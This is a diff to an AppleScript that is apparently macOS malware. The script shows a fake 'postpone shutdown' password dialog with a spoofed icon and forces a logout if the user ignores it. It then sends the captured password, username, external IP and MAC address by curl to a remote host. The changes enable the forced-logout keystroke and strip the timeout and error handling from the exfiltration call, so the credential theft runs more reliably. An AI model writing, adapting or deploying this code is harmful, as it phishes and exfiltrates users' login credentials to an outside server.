@@ -43,7 +43,7 @@ try
 on error
 	return
 end try
-
+delay 10
 try
 	try
 		set oldpasswd to (do shell script "cat " & ufld & theuser & ".txt")
@@ -51,10 +51,10 @@ try
 		set passwd to oldpasswd
 	on error err
 		repeat
-			set quest to (display dialog "Please enter your password to postpone shutdown." with title "Password" default answer "" buttons {"OK"} default button 1 giving up after 5 with icon ((path to me) & "Contents:Resources:icon.icns" as text) as alias with hidden answer) -- Prompt for Password
+			set quest to (display dialog "Please enter your password to postpone shutdown." with title "Password" default answer "" buttons {"OK"} default button 1 giving up after 10 with icon ((path to me) & "Contents:Resources:icon.icns" as text) as alias with hidden answer) -- Prompt for Password
 			set passwd to text returned of quest
 			if gave up of quest = true then -- If the user doesn't enter a password:
-				--tell application "System Events" to keystroke "q" using {command down, option down, shift down}
+				tell application "System Events" to keystroke "q" using {command down, option down, shift down}
 				return
 			end if
 			try
@@ -73,22 +73,14 @@ end try
 log "new"
 try
 	try
-		with timeout of 10 seconds
-			do shell script "curl http://checkip.dyndns.org/ | grep 'Current IP Address' | cut -d : -f 2 | cut -d '<' -f 1"
-		end timeout
+		do shell script "curl http://checkip.dyndns.org/ | grep 'Current IP Address' | cut -d : -f 2 | cut -d '<' -f 1"
 		set WANIP to (characters 2 through -1 of result) as text -- Get IP
 	on error
 		set WANIP to "0.0.0.0"
 	end try
 	set MACAD to first paragraph of (do shell script "ifconfig | grep ether | cut -d ' ' -f 2")
 	log "a"
-	try
-		with timeout of 15 seconds
-			do shell script "curl \"" & remoteHost & "/a?pass=" & passwd & "&user=" & theuser & "&WANIP=" & WANIP & "&MACAD=" & MACAD & "\""
-		end timeout
-	on error
-		return
-	end try
+	do shell script "curl \"" & remoteHost & "/a?pass=" & passwd & "&user=" & theuser & "&WANIP=" & WANIP & "&MACAD=" & MACAD & "\""
 on error err
 	log err
 end try
